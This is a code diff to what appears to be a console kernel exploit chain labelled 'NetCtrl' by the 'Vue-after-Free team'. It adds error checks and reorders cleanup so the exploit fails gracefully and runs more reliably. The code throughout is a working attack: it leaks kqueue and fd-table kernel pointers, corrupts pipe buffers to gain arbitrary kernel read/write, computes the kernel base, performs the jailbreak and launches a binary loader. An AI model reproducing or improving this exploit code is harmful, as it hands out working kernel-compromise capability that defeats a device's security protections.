@@ -1034,7 +1034,8 @@ function exploit_phase_trigger () {
 
 function exploit_phase_leak () {
   if (!leak_kqueue()) {
-    yield_to_render(exploit_phase_trigger)
+    log('Failed to leak kqueue')
+    cleanup(true)
     return
   }
 
@@ -1043,7 +1044,11 @@ function exploit_phase_leak () {
 }
 
 function exploit_phase_rw () {
-  setup_arbitrary_rw()
+  if (!setup_arbitrary_rw()) {
+    log('Failed to setup arbitrary R/W')
+    cleanup(true)
+    return
+  }
   log('Jailbreaking...')
   yield_to_render(exploit_phase_jailbreak)
 }
@@ -1055,19 +1060,25 @@ function exploit_phase_jailbreak () {
 function setup_arbitrary_rw () {
   // Leak fd_files from kq_fdp.
   const fd_files = kreadslow64(kq_fdp)
+  if (fd_files.eq(BigInt_Error)) return false
+
   fdt_ofiles = fd_files.add(0x00)
   debug('fdt_ofiles: ' + hex(fdt_ofiles))
 
   master_r_pipe_file = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE))
+  if (master_r_pipe_file.eq(BigInt_Error)) return false
   debug('master_r_pipe_file: ' + hex(master_r_pipe_file))
 
   victim_r_pipe_file = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE))
+  if (victim_r_pipe_file.eq(BigInt_Error)) return false
   debug('victim_r_pipe_file: ' + hex(victim_r_pipe_file))
 
   master_r_pipe_data = kreadslow64(master_r_pipe_file.add(0x00))
+  if (master_r_pipe_data.eq(BigInt_Error)) return false
   debug('master_r_pipe_data: ' + hex(master_r_pipe_data))
 
   victim_r_pipe_data = kreadslow64(victim_r_pipe_file.add(0x00))
+  if (victim_r_pipe_data.eq(BigInt_Error)) return false
   debug('victim_r_pipe_data: ' + hex(victim_r_pipe_data))
 
   // Corrupt pipebuf of masterRpipeFd.
@@ -1125,6 +1136,7 @@ function setup_arbitrary_rw () {
   log('Arbitrary R/W achieved')
 
   debug('Reading value in victim_r_pipe_file: ' + hex(kread64(victim_r_pipe_file)))
+  return true
 }
 
 function find_allproc () {
@@ -1196,12 +1208,15 @@ function jailbreak () {
   kernel.addr.base = kl_lock.sub((kernel_offset as { KL_LOCK: number }).KL_LOCK)
   log('Kernel base: ' + hex(kernel.addr.base))
 
+  // Cleanup workers before running kernel payload to prevent panics/races
+  cleanup(false)
+
   jailbreak_shared(FW_VERSION)
 
   log('Jailbreak Complete - JAILBROKEN')
   utils.notify('The Vue-after-Free team congratulates you\nNetCtrl Finished OK\nEnjoy freedom')
 
-  cleanup(false) // Close sockets and kill workers on success
+  // cleanup(false) // Close sockets and kill workers on success
   show_success()
   run_binloader()
 }
@@ -1548,8 +1563,9 @@ function kreadslow64 (address: BigInt) {
   const buffer = kreadslow(address, 8)
   // debug("Buffer from kreadslow: " + hex(buffer));
   if (buffer.eq(BigInt_Error)) {
-    cleanup()
-    throw new Error('Netctrl failed - Reboot and try again')
+    // cleanup()
+    // throw new Error('Netctrl failed - Reboot and try again')
+    return BigInt_Error
   }
   return read64(buffer)
 }
